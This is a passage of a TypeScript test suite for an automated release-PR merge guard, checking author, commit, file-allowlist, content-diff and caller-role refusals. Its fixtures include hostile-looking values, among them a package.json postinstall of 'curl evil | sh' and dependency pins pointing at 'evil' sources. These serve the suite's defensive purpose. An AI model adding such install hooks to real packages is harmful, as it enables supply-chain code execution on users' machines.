/**
 * Hermetic tests for the `release` source kind (AISDLC-702). Every GitHub call
 * goes through an injected fake Runner; nothing touches the network.
 */

import { describe, expect, it } from 'vitest';
import { mkdirSync, mkdtempSync, readFileSync, readdirSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import {
  commitAuthorRefusal,
  defaultAuditWriter,
  hasActiveTaskSentinel,
  NEXT_STEP_PREFIX,
  jsonContentRefusal,
  jsonDiffPaths,
  tomlContentRefusal,
  isReleaseArtifactPath,
  nonReleaseFiles,
  RELEASE_BOT_EMAIL,
  RELEASE_BRANCH,
  resolveCallerRole,
  resolveReleaseGovernance,
  runReleaseMerge,
  type ReleaseAuditRecord,
  type RunReleaseMergeOptions,
} from './release-merge.js';
import {
  resolveGovernanceFromYaml,
  evaluateMergeEligibility,
  runMergeIfEligible,
  STRICT_DEFAULTS,
} from './merge-if-eligible.js';
import type { ExecResult, Runner } from '../runtime/exec.js';

const HEAD = 'c'.repeat(40);
const MAIN_SHA = 'd'.repeat(40);
const YAML =
  'spec:\n  governance:\n    allowMerge: never\n    allowReleaseMerge: true\n    releaseAuthors: [deefactorial]\n';
const G = 'spec:\n  governance:\n    allowReleaseMerge: true\n';

interface Fixture {
  pr?: Record<string, unknown>;
  prAfter?: Record<string, unknown>;
  commits?: Array<{
    sha: string;
    login: string | null;
    email: string;
    clogin?: string | null;
    cemail?: string;
    verified?: boolean;
  }>;
  files?: Array<string | { path: string; status?: string; previous?: string }>;
  /** Per-path overrides: base/head file text, or a head contents-API type. */
  blobs?: Record<string, { base?: string; head?: string; headType?: string; fail?: boolean }>;
  required?: Array<{ name: string; state: string }>;
  shaChecks?: Array<{ name: string; status: string; conclusion: string | null }>;
  mergeFails?: boolean;
}

function pr(over: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    headRefOid: HEAD,
    headRefName: RELEASE_BRANCH,
    baseRefName: 'main',
    isCrossRepository: false,
    author: { login: 'deefactorial' },
    title: 'chore: release main',
    mergeStateStatus: 'CLEAN',
    files: [],
    ...over,
  };
}

function defaultText(path: string, head: boolean): string {
  const v = head ? '0.2.0' : '0.1.0';
  if (path.endsWith('CHANGELOG.md')) return head ? '# Changelog\n\n## 0.2.0\n' : '# Changelog\n';
  if (path === '.release-please-manifest.json') return JSON.stringify({ a: v, 'b/c': v });
  if (path.endsWith('plugin.json') && path.startsWith('ai-sdlc-plugin')) {
    return JSON.stringify({
      name: 'p',
      version: v,
      runtimeDependencies: {
        '@ai-sdlc/orchestrator': `>=${v} <1.0.0`,
        '@ai-sdlc/pipeline-cli': `>=${v} <1.0.0`,
        '@ai-sdlc/plugin-mcp-server': '0.9.2',
      },
      hooks: { PreToolUse: [] },
    });
  }
  return JSON.stringify({ name: 'x', version: v, scripts: { build: 'tsc' } });
}

function makeRunner(f: Fixture = {}) {
  const calls: string[] = [];
  let views = 0;
  const runner: Runner = async (command, args) => {
    const key = `${command} ${args.join(' ')}`;
    calls.push(key);
    const ok = (stdout: string): ExecResult => ({ stdout, stderr: '', code: 0 });
    if (key.includes('pr view')) {
      views += 1;
      return ok(JSON.stringify(views > 1 && f.prAfter ? f.prAfter : (f.pr ?? pr())));
    }
    if (key.includes('git/ref/heads/main'))
      return ok(JSON.stringify({ type: 'commit', sha: MAIN_SHA }));
    if (key.includes('/pulls/') && key.includes('/commits')) {
      const commits = f.commits ?? [
        { sha: HEAD, login: 'deefactorial', email: 'deefactorial@example.com' },
      ];
      return ok(
        commits
          .map((c) =>
            JSON.stringify({
              sha: c.sha,
              login: c.login,
              email: c.email,
              clogin: c.clogin === undefined ? c.login : c.clogin,
              cemail: c.cemail ?? c.email,
              verified: c.verified ?? false,
            }),
          )
          .join('\n'),
      );
    }
    if (key.includes('api user')) return ok('deefactorial\n');
    if (key.includes('/contents/')) {
      const m = /contents\/(.+)\?ref=([0-9a-f]+)/.exec(key)!;
      const [, path, ref] = m;
      const o = f.blobs?.[path];
      if (o?.fail) return { stdout: '', stderr: 'HTTP 404', code: 1 };
      const isHead = ref === HEAD;
      const text = isHead
        ? (o?.head ?? defaultText(path, true))
        : (o?.base ?? defaultText(path, false));
      return ok(
        JSON.stringify({
          type: isHead ? (o?.headType ?? 'file') : 'file',
          content: Buffer.from(text).toString('base64'),
        }),
      );
    }
    if (key.includes('/compare/')) {
      return ok(
        (f.files ?? ['CHANGELOG.md', 'pipeline-cli/package.json', '.release-please-manifest.json'])
          .map((p) => {
            const o = typeof p === 'string' ? { path: p } : p;
            return JSON.stringify({
              filename: o.path,
              status: o.status ?? 'modified',
              previous_filename: o.previous,
            });
          })
          .join('\n'),
      );
    }
    if (key.includes('pr checks')) {
      return ok(JSON.stringify(f.required ?? [{ name: 'ai-sdlc/pr-ready', state: 'SUCCESS' }]));
    }
    if (key.includes('/check-runs')) {
      return ok(
        (f.shaChecks ?? [{ name: 'ai-sdlc/pr-ready', status: 'completed', conclusion: 'success' }])
          .map((c) => JSON.stringify(c))
          .join('\n'),
      );
    }
    if (key.includes('/status')) return ok('');
    if (key.includes('pr merge')) {
      return f.mergeFails ? { stdout: '', stderr: 'boom', code: 1 } : ok('');
    }
    throw new Error(`unexpected call: ${key}`);
  };
  return { runner, calls };
}

function run(f: Fixture = {}, over: Partial<RunReleaseMergeOptions> = {}) {
  const { runner, calls } = makeRunner(f);
  const audit: ReleaseAuditRecord[] = [];
  const result = runReleaseMerge({
    prNumber: 1105,
    repoSlug: 'org/repo',
    runner,
    policyYaml: YAML,
    callerRole: 'operator',
    caller: 'tester',
    audit: (r) => audit.push(r),
    now: () => new Date('2026-10-03T12:00:00Z'),
    ...over,
  });
  return { result, calls, audit };
}

describe('runReleaseMerge: success', () => {
  it('arms a genuine release PR with squash, pinned to the head, and audits it', async () => {
    const { result, calls, audit } = run({}, { mode: 'arm' });
    const r = await result;
    expect(r.eligibility.eligible).toBe(true);
    expect(r.armed).toBe(true);
    const merge = calls.find((c) => c.includes('pr merge'))!;
    expect(merge).toContain('--auto');
    expect(merge).toContain('--squash');
    expect(merge).toContain(`--match-head-commit ${HEAD}`);
    expect(audit).toHaveLength(1);
    expect(audit[0]).toMatchObject({
      sourceKind: 'release',
      outcome: 'armed',
      caller: 'tester',
      callerRole: 'operator',
      prNumber: 1105,
      headSha: HEAD,
    });
  });

  it('merges (non-arm) a green + CLEAN release PR with squash', async () => {
    const { result, calls, audit } = run();
    const r = await result;
    expect(r.merged).toBe(true);
    const merge = calls.find((c) => c.includes('pr merge'))!;
    expect(merge).not.toContain('--auto');
    expect(merge).toContain('--squash');
    expect(audit[0].outcome).toBe('merged');
  });

  it('accepts the unlinked release-bot pin-sync commit alongside the release-please commit', async () => {
    const { result } = run({
      commits: [
        { sha: 'a'.repeat(40), login: 'deefactorial', email: 'x@y.z' },
        { sha: HEAD, login: null, email: RELEASE_BOT_EMAIL },
      ],
      files: ['ai-sdlc-plugin/plugin.json', 'ai-sdlc-plugin/.claude-plugin/plugin.json'],
    });
    expect((await result).merged).toBe(true);
  });

  it('dry-run never calls pr merge', async () => {
    const { result, calls, audit } = run({}, { dryRun: true });
    const r = await result;
    expect(r.eligibility.eligible).toBe(true);
    expect(calls.some((c) => c.includes('pr merge'))).toBe(false);
    expect(audit[0].outcome).toBe('dry-run');
  });
});

describe('runReleaseMerge: refusals name the failed check', () => {
  const refused = async (f: Fixture, over: Partial<RunReleaseMergeOptions> = {}) => {
    const { result, calls, audit } = run(f, over);
    const r = await result;
    expect(r.eligibility.eligible).toBe(false);
    expect(r.merged).toBe(false);
    if (!f.mergeFails) expect(calls.some((c) => c.includes('pr merge'))).toBe(false);
    expect(audit[0].outcome).toBe('refused');
    return r.eligibility.reason;
  };

  it('human-authored PR on the release branch name', async () => {
    const reason = await refused({ pr: pr({ author: { login: 'mallory' } }) });
    expect(reason).toMatch(/check "PR author"/);
  });

  it('a non-release head branch', async () => {
    const reason = await refused({ pr: pr({ headRefName: 'ai-sdlc/aisdlc-1-x' }) });
    expect(reason).toMatch(/check "head ref"/);
  });

  it('fork PR', async () => {
    const reason = await refused({ pr: pr({ isCrossRepository: true }) });
    expect(reason).toMatch(/check "same-repo head"/);
  });

  it('extra non-allowlisted file', async () => {
    const reason = await refused({ files: ['CHANGELOG.md', 'pipeline-cli/src/evil.ts'] });
    expect(reason).toMatch(/check "changed files".*pipeline-cli\/src\/evil\.ts/);
  });

  it('commit by a non-bot author (linked and unlinked)', async () => {
    const linked = await refused({
      commits: [{ sha: HEAD, login: 'mallory', email: 'm@x.y' }],
    });
    expect(linked).toMatch(/check "commit authors"/);
    const unlinked = await refused({
      commits: [{ sha: HEAD, login: null, email: 'someone@else.dev' }],
    });
    expect(unlinked).toMatch(/check "commit authors"/);
  });

  it('wrong base', async () => {
    const reason = await refused({ pr: pr({ baseRefName: 'develop' }) });
    expect(reason).toMatch(/check "base branch"/);
  });

  it('red required check', async () => {
    const reason = await refused({
      required: [{ name: 'ai-sdlc/pr-ready', state: 'SUCCESS' }],
      shaChecks: [{ name: 'ai-sdlc/pr-ready', status: 'completed', conclusion: 'failure' }],
    });
    expect(reason).toMatch(/check "required checks".*ai-sdlc\/pr-ready=FAILURE/);
  });

  it('arm needs the same readiness as merge: red AND pending both refuse', async () => {
    const red = await refused(
      { shaChecks: [{ name: 'ai-sdlc/pr-ready', status: 'completed', conclusion: 'failure' }] },
      { mode: 'arm' },
    );
    expect(red).toMatch(/check "required checks"/);
    const pending = await refused(
      { shaChecks: [{ name: 'ai-sdlc/pr-ready', status: 'in_progress', conclusion: null }] },
      { mode: 'arm' },
    );
    expect(pending).toMatch(/not green/);
    const notClean = await refused({ pr: pr({ mergeStateStatus: 'BLOCKED' }) }, { mode: 'arm' });
    expect(notClean).toMatch(/CLEAN/);
  });

  it('merge mode refuses a pending check', async () => {
    const reason = await refused({
      shaChecks: [{ name: 'ai-sdlc/pr-ready', status: 'in_progress', conclusion: null }],
    });
    expect(reason).toMatch(/not green/);
  });

  it('a head that moves after verification', async () => {
    const reason = await refused({ prAfter: pr({ headRefOid: 'e'.repeat(40) }) });
    expect(reason).toMatch(/head moved/);
  });

  it('GitHub refusing the merge', async () => {
    const reason = await refused({ mergeFails: true });
    expect(reason).toMatch(/refused the merge/);
  });

  it('an explicitly empty author list trusts nobody', async () => {
    const reason = await refused({}, { policyYaml: G + '    releaseAuthors: []\n' });
    expect(reason).toMatch(/explicitly empty/);
  });

  it('unreadable policy', async () => {
    const reason = await refused({}, { policyYaml: null });
    expect(reason).toMatch(/agent-role\.yaml/);
  });
});

describe('caller role (mistake guard)', () => {
  it('denies the executor role by default, before any PR is read', async () => {
    const { result, calls, audit } = run({}, { callerRole: 'executor' });
    const r = await result;
    expect(r.eligibility.eligible).toBe(false);
    expect(r.eligibility.reason).toMatch(/caller role "executor"/);
    expect(calls.some((c) => c.includes('pr view'))).toBe(false);
    expect(audit[0].callerRole).toBe('executor');
  });

  it('allows planner by default and honours governance.releaseMergeRoles', async () => {
    expect((await run({}, { callerRole: 'planner', mode: 'arm' }).result).armed).toBe(true);
    const yaml = `${YAML}    releaseMergeRoles: [operator]\n`;
    const r = await run({}, { callerRole: 'planner', policyYaml: yaml }).result;
    expect(r.eligibility.eligible).toBe(false);
  });

  it('resolveCallerRole: explicit env, active task => executor, otherwise undeterminable', () => {
    const bare = mkdtempSync(join(tmpdir(), 'role-bare-'));
    expect(resolveCallerRole({ AI_SDLC_CALLER_ROLE: 'Planner' }, bare)).toBe('planner');
    expect(resolveCallerRole({ AI_SDLC_ACTIVE_TASK_ID: 'AISDLC-1' }, bare)).toBe('executor');
    expect(resolveCallerRole({}, bare)).toBeNull();
  });

  it('an .active-task sentinel in an ancestor makes the default role executor', () => {
    const root = mkdtempSync(join(tmpdir(), 'role-sentinel-'));
    writeFileSync(join(root, '.active-task'), 'AISDLC-1\n');
    const nested = join(root, 'a', 'b');
    mkdirSync(nested, { recursive: true });
    expect(hasActiveTaskSentinel(nested)).toBe(true);
    expect(resolveCallerRole({}, nested)).toBe('executor');
    // explicit role still wins (mistake guard, not a boundary)
    expect(resolveCallerRole({ AI_SDLC_CALLER_ROLE: 'operator' }, nested)).toBe('operator');
  });

  it('refuses when the role is undeterminable, before reading the PR', async () => {
    const { result, calls } = run(
      {},
      { callerRole: undefined, cwd: mkdtempSync(join(tmpdir(), 'r-')) },
    );
    const saved = { ...process.env };
    delete process.env.AI_SDLC_CALLER_ROLE;
    delete process.env.AI_SDLC_ACTIVE_TASK_ID;
    try {
      const r = await result;
      expect(r.eligibility.reason).toMatch(/role could not be determined/);
      expect(calls.some((c) => c.includes('pr view'))).toBe(false);
    } finally {
      process.env = saved;
    }
  });

  it('resolveReleaseGovernance: each tier of the author chain (DEC-0050)', () => {
    const none = resolveReleaseGovernance('');
    expect(none).toEqual({
      roles: ['operator', 'planner'],
      authors: ['github-actions[bot]', 'release-please[bot]'],
      authorsSource: 'built-in default',
      allowReleaseMerge: false,
    });
    expect(resolveReleaseGovernance('spec:\n  governance:\n    mergeAuthors: [octocat]\n')).toEqual(
      {
        roles: ['operator', 'planner'],
        authors: ['octocat'],
        authorsSource: 'mergeAuthors',
        allowReleaseMerge: false,
      },
    );
    // empty mergeAuthors is "not set": falls through to the built-in default
    expect(
      resolveReleaseGovernance('spec:\n  governance:\n    mergeAuthors: []\n').authorsSource,
    ).toBe('built-in default');
    // explicit releaseAuthors wins over mergeAuthors
    expect(
      resolveReleaseGovernance(
        'spec:\n  governance:\n    mergeAuthors: [octocat]\n    releaseAuthors: [ok, "bad login!", "release-please[bot]"]\n    releaseMergeRoles: [Operator, "x y"]\n',
      ),
    ).toEqual({
      roles: ['operator'],
      authors: ['ok', 'release-please[bot]'],
      authorsSource: 'releaseAuthors',
      allowReleaseMerge: false,
    });
  });

  it('explicit empty releaseAuthors is the kill switch, even with mergeAuthors set', async () => {
    for (const yaml of [
      G + '    mergeAuthors: [deefactorial]\n    releaseAuthors: []\n',
      G + '    mergeAuthors: [deefactorial]\n    releaseAuthors:\n',
    ]) {
      expect(resolveReleaseGovernance(yaml).authors).toEqual([]);
      const r = await run({}, { policyYaml: yaml }).result;
      expect(r.eligibility.eligible).toBe(false);
      expect(r.eligibility.reason).toMatch(/explicitly empty/);
      expect(r.eligibility.reason).toContain(NEXT_STEP_PREFIX);
    }
  });

  it('mergeAuthors tier lets a PR from a mergeAuthors login through', async () => {
    const r = await run({}, { policyYaml: G + '    mergeAuthors: [deefactorial]\n' }).result;
    expect(r.merged).toBe(true);
  });

  it('built-in default tier: standard bots pass, in both REST and gh spellings', async () => {
    for (const login of ['github-actions[bot]', 'app/github-actions', 'app/release-please']) {
      const r = await run(
        {
          pr: pr({ author: { login } }),
          commits: [{ sha: HEAD, login: 'github-actions[bot]', email: 'b@x.y' }],
        },
        { policyYaml: G },
      ).result;
      expect(r.merged, login).toBe(true);
    }
  });

  it('NO governance config + non-bot PR author: names key, actual login, and source', async () => {
    const r = await run({}, { policyYaml: G }).result;
    expect(r.eligibility.eligible).toBe(false);
    const msg = r.eligibility.reason;
    expect(msg).toContain('the PR author is "deefactorial"');
    expect(msg).toContain('governance.releaseAuthors: [deefactorial]');
    expect(msg).toContain('(source: built-in default)');
    expect(msg).toContain('github-actions[bot]');
    expect(msg).toContain(NEXT_STEP_PREFIX);
  });

  it('names the source tier in the author refusal', async () => {
    const m = await run(
      { pr: pr({ author: { login: 'mallory' } }) },
      { policyYaml: G + '    mergeAuthors: [octocat]\n' },
    ).result;
    expect(m.eligibility.reason).toContain('(source: mergeAuthors)');
    expect(m.eligibility.reason).toContain('governance.releaseAuthors: [mallory]');
    const r = await run({ pr: pr({ author: { login: 'mallory' } }) }).result;
    expect(r.eligibility.reason).toContain('(source: releaseAuthors)');
  });

  it('the fallback chain does not widen the backlog path: mergeAuthors semantics unchanged', () => {
    // backlog path: empty/absent mergeAuthors trusts nobody, bot defaults never apply
    expect(resolveGovernanceFromYaml('').mergeAuthors).toEqual([]);
    expect(
      resolveGovernanceFromYaml('spec:\n  governance:\n    releaseAuthors: [x]\n').mergeAuthors,
    ).toEqual([]);
    expect(
      resolveGovernanceFromYaml('spec:\n  governance:\n    mergeAuthors: [octocat]\n').mergeAuthors,
    ).toEqual(['octocat']);
  });

  it('planner is allowed; the executor refusal names the role and the allowed list', async () => {
    const ok = await run({}, { callerRole: 'planner' }).result;
    expect(ok.merged).toBe(true);
    const denied = await run({}, { callerRole: 'executor' }).result;
    expect(denied.eligibility.reason).toContain(
      'release PR refused: caller role "executor" is not allowed to use --source-kind release ' +
        '(governance.releaseMergeRoles: operator, planner)',
    );
  });

  it('records the gh login in the audit record', async () => {
    const { result, audit } = run();
    await result;
    expect(audit[0].ghLogin).toBe('deefactorial');
    expect(audit[0].commitsVerified).toBe(false);
  });
});

describe('file content validation', () => {
  const refused = async (f: Fixture) => {
    const { result, calls } = run(f);
    const r = await result;
    expect(r.eligibility.eligible).toBe(false);
    expect(r.merged).toBe(false);
    expect(calls.some((c) => c.includes('pr merge'))).toBe(false);
    return r.eligibility.reason;
  };
  const PLUGIN = 'ai-sdlc-plugin/plugin.json';

  it('accepts version bumps and pin-sync runtimeDependencies changes', async () => {
    const r = await run({
      files: [
        PLUGIN,
        'ai-sdlc-plugin/.claude-plugin/plugin.json',
        'ai-sdlc-plugin/mcp-server/package.json',
      ],
    }).result;
    expect(r.merged).toBe(true);
  });

  it('refuses a plugin.json change outside version/pins (hooks)', async () => {
    const base = defaultText(PLUGIN, false);
    const head = JSON.stringify({ ...JSON.parse(defaultText(PLUGIN, true)), hooks: { evil: 1 } });
    const reason = await refused({ files: [PLUGIN], blobs: { [PLUGIN]: { base, head } } });
    expect(reason).toMatch(/ai-sdlc-plugin\/plugin\.json: key "hooks\.(evil|PreToolUse)" changed/);
  });

  it('refuses a package.json scripts addition', async () => {
    const f = 'pipeline-cli/package.json';
    const head = JSON.stringify({
      name: 'x',
      version: '0.2.0',
      scripts: { build: 'tsc', postinstall: 'curl evil | sh' },
    });
    const reason = await refused({ files: [f], blobs: { [f]: { head } } });
    expect(reason).toMatch(/pipeline-cli\/package\.json: key "scripts\.postinstall" changed/);
  });

  it('refuses a version field that is not a version, and a pin of the wrong shape', async () => {
    const f = 'pipeline-cli/package.json';
    const bad = JSON.stringify({ name: 'x', version: 'http://evil', scripts: { build: 'tsc' } });
    expect(await refused({ files: [f], blobs: { [f]: { head: bad } } })).toMatch(/key "version"/);
    const pin = JSON.parse(defaultText(PLUGIN, true));
    pin.runtimeDependencies['@ai-sdlc/orchestrator'] = 'github:evil/x';
    expect(
      await refused({ files: [PLUGIN], blobs: { [PLUGIN]: { head: JSON.stringify(pin) } } }),
    ).toMatch(/runtimeDependencies\.@ai-sdlc\/orchestrator/);
  });

  it('refuses a new key in the release-please manifest and unparsable content', async () => {
    const f = '.release-please-manifest.json';
    const head = JSON.stringify({ a: '0.2.0', 'b/c': '0.2.0', extra: '1.0.0' });
    expect(await refused({ files: [f], blobs: { [f]: { head } } })).toMatch(/key "extra"/);
    expect(await refused({ files: [f], blobs: { [f]: { head: '{not json' } } })).toMatch(
      /not parseable JSON/,
    );
  });

  it('refuses removed and renamed files', async () => {
    expect(await refused({ files: [{ path: 'CHANGELOG.md', status: 'removed' }] })).toMatch(
      /removal/,
    );
    expect(
      await refused({
        files: [{ path: 'CHANGELOG.md', status: 'renamed', previous: 'sdk-go/CHANGELOG.md' }],
      }),
    ).toMatch(/rename\/copy/);
  });

  it('refuses a symlink (even CHANGELOG.md) and a submodule', async () => {
    expect(
      await refused({
        files: ['CHANGELOG.md'],
        blobs: { 'CHANGELOG.md': { headType: 'symlink' } },
      }),
    ).toMatch(/is a "symlink"/);
    expect(
      await refused({
        files: ['pipeline-cli/package.json'],
        blobs: { 'pipeline-cli/package.json': { headType: 'submodule' } },
      }),
    ).toMatch(/is a "submodule"/);
  });

  it('fails closed when a blob cannot be fetched', async () => {
    expect(
      await refused({
        files: ['pipeline-cli/package.json'],
        blobs: { 'pipeline-cli/package.json': { fail: true } },
      }),
    ).toMatch(/could not fetch/);
  });

  it('CHANGELOG.md may change arbitrarily', async () => {
    const r = await run({
      files: ['CHANGELOG.md'],
      blobs: { 'CHANGELOG.md': { head: 'anything at all\n<script>' } },
    }).result;
    expect(r.merged).toBe(true);
  });

  it('pyproject.toml: only the version line may change', () => {
    const base = '[project]\nname = "x"\nversion = "0.1.0"\ndeps = []\n';
    expect(tomlContentRefusal('p.toml', base, base.replace('0.1.0', '0.2.0'))).toBeNull();
    expect(
      tomlContentRefusal(
        'p.toml',
        base,
        base.replace('deps = []', 'deps = ["evil"]').replace('0.1.0', '0.2.0'),
      ),
    ).toMatch(/other than the "version" key/);
  });

  it('jsonDiffPaths flags array length and structural changes', () => {
    expect(jsonDiffPaths({ a: [1] }, { a: [1, 2] }).map((d) => d.path.join('.'))).toEqual(['a']);
    expect(jsonContentRefusal('package/package.json', '{"a":1}', '{"a":1,"b":2}')).toMatch(/"b"/);
  });
});

describe('every refusal ends with a next step the agent can take (DEC-0048)', () => {
  const PLUGIN = 'ai-sdlc-plugin/plugin.json';
  const scenarios: Array<[string, Fixture, Partial<RunReleaseMergeOptions>]> = [
    ['unreadable policy', {}, { policyYaml: null }],
    ['role undeterminable', {}, { callerRole: undefined, cwd: mkdtempSync(join(tmpdir(), 'ns-')) }],
    ['role not allowed', {}, { callerRole: 'executor' }],
    ['no config, non-bot author', {}, { policyYaml: G }],
    ['explicit empty releaseAuthors', {}, { policyYaml: G + '    releaseAuthors: []\n' }],
    ['non-squash method', {}, { mergeMethod: 'merge' }],
    ['fork', { pr: pr({ isCrossRepository: true }) }, {}],
    ['head ref', { pr: pr({ headRefName: 'x/y' }) }, {}],
    ['base', { pr: pr({ baseRefName: 'dev' }) }, {}],
    ['author', { pr: pr({ author: { login: 'mallory' } }) }, {}],
    ['commit author', { commits: [{ sha: HEAD, login: 'mallory', email: 'm@x.y' }] }, {}],
    ['extra file', { files: ['src/evil.ts'] }, {}],
    ['content', { files: [PLUGIN], blobs: { [PLUGIN]: { head: '{"hooks":1}' } } }, {}],
    [
      'symlink',
      { files: ['CHANGELOG.md'], blobs: { 'CHANGELOG.md': { headType: 'symlink' } } },
      {},
    ],
    ['blob fetch', { files: [PLUGIN], blobs: { [PLUGIN]: { fail: true } } }, {}],
    [
      'red check',
      { shaChecks: [{ name: 'ai-sdlc/pr-ready', status: 'completed', conclusion: 'failure' }] },
      {},
    ],
    ['not clean', { pr: pr({ mergeStateStatus: 'BLOCKED' }) }, {}],
    ['head moved', { prAfter: pr({ headRefOid: 'e'.repeat(40) }) }, {}],
    ['github refused', { mergeFails: true }, {}],
  ];
  const saved = { ...process.env };
  it.each(scenarios)('%s', async (_name, fixture, over) => {
    delete process.env.AI_SDLC_CALLER_ROLE;
    delete process.env.AI_SDLC_ACTIVE_TASK_ID;
    try {
      const r = await run(fixture, over).result;
      expect(r.eligibility.eligible).toBe(false);
      expect(r.eligibility.reason).toContain(NEXT_STEP_PREFIX);
      expect(r.eligibility.reason).not.toMatch(/ask the operator/i);
      expect(r.eligibility.reason).toMatch(
        /dispatch\/planner|AI_SDLC_CALLER_ROLE|re-run|gh workflow run/,
      );
    } finally {
      process.env = { ...saved };
    }
  });

  it('names the sanctioned role exit', async () => {
    const b = await run({}, { callerRole: 'executor' }).result;
    expect(b.eligibility.reason).toMatch(/dispatch\/planner session runs this command/);
  });
});

describe('enablement: allowMerge or allowReleaseMerge (DEC-0050 ruling b)', () => {
  const refusedMsg = async (yaml: string) => {
    const { result, calls } = run({}, { policyYaml: yaml });
    const r = await result;
    expect(r.eligibility.eligible).toBe(false);
    expect(calls.some((c) => c.includes('pr view') || c.includes('pr merge'))).toBe(false);
    return r.eligibility.reason;
  };

  it('allowReleaseMerge defaults to false and is a strict boolean', () => {
    expect(resolveReleaseGovernance('').allowReleaseMerge).toBe(false);
    expect(
      resolveReleaseGovernance('spec:\n  governance:\n    allowReleaseMerge: true\n')
        .allowReleaseMerge,
    ).toBe(true);
    for (const v of ['yes', '1', 'false']) {
      expect(
        resolveReleaseGovernance(`spec:\n  governance:\n    allowReleaseMerge: ${v}\n`)
          .allowReleaseMerge,
      ).toBe(false);
    }
  });

  it('neither set: refused, names both exits with key and value, current values, next step', async () => {
    for (const yaml of ['', 'spec:\n  governance:\n    allowMerge: never\n']) {
      const msg = await refusedMsg(yaml);
      expect(msg).toContain('release merges are not enabled');
      expect(msg).toContain('currently allowMerge=never, allowReleaseMerge=false');
      expect(msg).toContain('governance.allowMerge: onGreenClean');
      expect(msg).toContain('governance.allowReleaseMerge: true');
      expect(msg).toContain(`${NEXT_STEP_PREFIX} the dispatch/planner session sets`);
    }
  });

  it('allowReleaseMerge: true alone enables; allowMerge: onGreenClean alone enables', async () => {
    expect(
      (await run({}, { policyYaml: G + '    releaseAuthors: [deefactorial]\n' }).result).merged,
    ).toBe(true);
    const only = 'spec:\n  governance:\n    allowMerge: onGreenClean\n';
    expect(
      (await run({}, { policyYaml: only + '    releaseAuthors: [deefactorial]\n' }).result).merged,
    ).toBe(true);
  });

  it('explicit empty releaseAuthors disables release merges whichever grant is set, in either key order', async () => {
    for (const yaml of [
      'spec:\n  governance:\n    allowReleaseMerge: true\n    releaseAuthors: []\n',
      'spec:\n  governance:\n    releaseAuthors: []\n    allowReleaseMerge: true\n',
      'spec:\n  governance:\n    releaseAuthors: []\n    allowMerge: onGreenClean\n',
    ]) {
      const r = await run({}, { policyYaml: yaml }).result;
      expect(r.eligibility.eligible).toBe(false);
      expect(r.eligibility.reason).toMatch(/explicitly empty/);
    }
  });

  it('allowReleaseMerge never satisfies the backlog or gh-issue kinds', () => {
    for (const sourceKind of ['backlog', 'gh-issue', 'release'] as const) {
      const r = evaluateMergeEligibility({
        policy: STRICT_DEFAULTS,
        sourceKind,
        mergeStateStatus: 'CLEAN',
        requiredChecks: [{ name: 'a', state: 'SUCCESS' }],
        allowReleaseMerge: true,
      });
      expect(r.eligible, sourceKind).toBe(false);
      expect(r.reason).toMatch(/allowMerge="never"/);
    }
    // the grant only counts for a VERIFIED release kind
    const ok = evaluateMergeEligibility({
      policy: STRICT_DEFAULTS,
      sourceKind: 'release',
      releaseVerified: true,
      allowReleaseMerge: true,
      mergeStateStatus: 'CLEAN',
      requiredChecks: [{ name: 'a', state: 'SUCCESS' }],
    });
    expect(ok.eligible).toBe(true);
  });

  it('the backlog path still needs allowMerge: onGreenClean even when allowReleaseMerge is true', async () => {
    const yaml = 'spec:\n  governance:\n    allowReleaseMerge: true\n    mergeAuthors: [x]\n';
    const runner: Runner = async (_c, a) => {
      if (a.join(' ').includes('git/ref/heads/main')) {
        return { stdout: JSON.stringify({ type: 'commit', sha: MAIN_SHA }), stderr: '', code: 0 };
      }
      return { stdout: yaml, stderr: '', code: 0 };
    };
    const r = await runMergeIfEligible({
      prNumber: 1,
      sourceKind: 'backlog',
      repoSlug: 'org/repo',
      repoRoot: '/tmp',
      runner,
      policyYaml: yaml,
    });
    expect(r.eligibility.eligible).toBe(false);
    expect(r.eligibility.reason).toMatch(/allowMerge="never"/);
  });
});

describe('merge method', () => {
  it('refuses a non-squash method with a next step and never merges', async () => {
    for (const m of ['merge', 'rebase'] as const) {
      const { result, calls } = run({}, { mergeMethod: m });
      const r = await result;
      expect(r.eligibility.eligible).toBe(false);
      expect(r.eligibility.reason).toMatch(/not allowed for --source-kind release \(squash only\)/);
      expect(r.eligibility.reason).toContain('--merge-method squash');
      expect(calls.some((c) => c.includes('pr merge'))).toBe(false);
    }
    expect((await run({}, { mergeMethod: 'squash' }).result).merged).toBe(true);
  });
});

describe('commit identity', () => {
  it('unsigned commits are accepted (real release commits are unsigned) but recorded', async () => {
    const { result, audit } = run({
      commits: [{ sha: HEAD, login: 'deefactorial', email: 'e@x.y', verified: false }],
    });
    expect((await result).merged).toBe(true);
    expect(audit[0].commitsVerified).toBe(false);
  });

  it('refuses a commit whose committer is not an allowed identity', async () => {
    const { result } = run({
      commits: [{ sha: HEAD, login: 'deefactorial', email: 'e@x.y', clogin: 'mallory' }],
    });
    const r = await result;
    expect(r.eligibility.reason).toMatch(/committer is "mallory"/);
  });

  it('refuses an unlinked committer that is not the release bot', async () => {
    const { result } = run({
      commits: [
        { sha: HEAD, login: 'deefactorial', email: 'e@x.y', clogin: null, cemail: 'x@evil.dev' },
      ],
    });
    expect((await result).eligibility.reason).toMatch(/unlinked committer "x@evil\.dev"/);
  });
});

describe('allowlist and helpers', () => {
  it('accepts release artifacts and rejects everything else', () => {
    for (const p of [
      'CHANGELOG.md',
      'pipeline-cli/CHANGELOG.md',
      '.release-please-manifest.json',
      '.claude-plugin/marketplace.json',
      'ai-sdlc-plugin/plugin.json',
      'ai-sdlc-plugin/.claude-plugin/plugin.json',
      'ai-sdlc-plugin/mcp-server/package.json',
      'orchestrator/package.json',
    ]) {
      expect(isReleaseArtifactPath(p)).toBe(true);
    }
    for (const p of ['pipeline-cli/src/x.ts', 'package.json', '.github/workflows/release.yml']) {
      expect(isReleaseArtifactPath(p)).toBe(false);
    }
  });

  it('a rename out of a non-allowlisted path is refused via previousPath', () => {
    expect(
      nonReleaseFiles([{ path: 'CHANGELOG.md', previousPath: 'src/secret.ts', status: 'renamed' }]),
    ).toEqual(['src/secret.ts']);
  });

  it('commitAuthorRefusal accepts allowed logins and the unlinked release bot only', () => {
    const base = { committerLogin: null, committerEmail: RELEASE_BOT_EMAIL, verified: false };
    expect(
      commitAuthorRefusal(
        [
          {
            ...base,
            sha: 'a'.repeat(40),
            authorLogin: 'DeeFactorial',
            authorEmail: 'q',
            committerLogin: 'deefactorial',
            committerEmail: 'q',
          },
          {
            ...base,
            sha: 'b'.repeat(40),
            authorLogin: null,
